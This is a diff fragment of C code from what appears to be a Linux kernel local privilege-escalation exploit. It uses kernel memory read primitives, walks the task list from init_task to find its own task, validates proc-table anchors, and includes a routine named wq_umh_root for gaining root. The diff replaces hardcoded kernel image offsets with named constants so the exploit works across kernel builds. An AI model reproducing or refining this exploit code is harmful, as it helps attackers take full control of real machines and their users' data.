@@ -2357,7 +2357,7 @@ static uintptr_t perf_own_task(void) {
  * confirmation.  Bounded at 400 hops; safe on list mutation (a freed task's
  * links fail is_direct_ptr and we bail). */
 static uintptr_t listwalk_own_task(void) {
-  uintptr_t head = data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL) + TASK_TASKS_OFF;
+  uintptr_t head = data_addr(KIMAGE_TEXT_BASE + INIT_TASK_OFF) + TASK_TASKS_OFF;
   uint64_t cur = rwf_read64(head + 8);        /* tasks.prev = newest */
   uint64_t first = cur;
   int hops = 0;
@@ -2777,8 +2777,8 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
       if (rwf_phys_read(ent, entbuf, sizeof(entbuf)))
         break;
     static const struct { int idx; uint64_t expect_img; const char *name; } triplet[] = {
-      { 0, 0x017CEDD0ULL, "procname" },      /* -> "boot_id" string */
-      { 3, 0x009CD4CCULL, "proc_handler" },  /* -> proc_do_uuid */
+      { 0, BOOTID_STR_IMG_OFF, "procname" },   /* -> "boot_id" string */
+      { 3, PROC_DO_UUID_OFF, "proc_handler" }, /* -> proc_do_uuid */
       /* NB: the data field (+0x08) is unusable as an anchor — the oracle's
        * restore leaves a physmap-ALIAS pointer in it, not a canonical VA. */
     };
@@ -2809,9 +2809,9 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
        * 32-slot rd ring is nearly full. */
       if (getenv("GL_SLIDE_CHECK")) {
         uint64_t st = 0, amm = 0;
-      rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL + TASK_STACK_OFF),
+      rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + INIT_TASK_OFF + TASK_STACK_OFF),
                     &st, 8);
-      rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL + TASK_ACTIVE_MM_OFF),
+      rwf_phys_read(data_addr(KIMAGE_TEXT_BASE + INIT_TASK_OFF + TASK_ACTIVE_MM_OFF),
                     &amm, 8);
       pr_info("wq-umh: post-slide check init_task.stack=%016llx (expect %016llx) active_mm=%016llx (expect %016llx)\n",
               (unsigned long long)st,
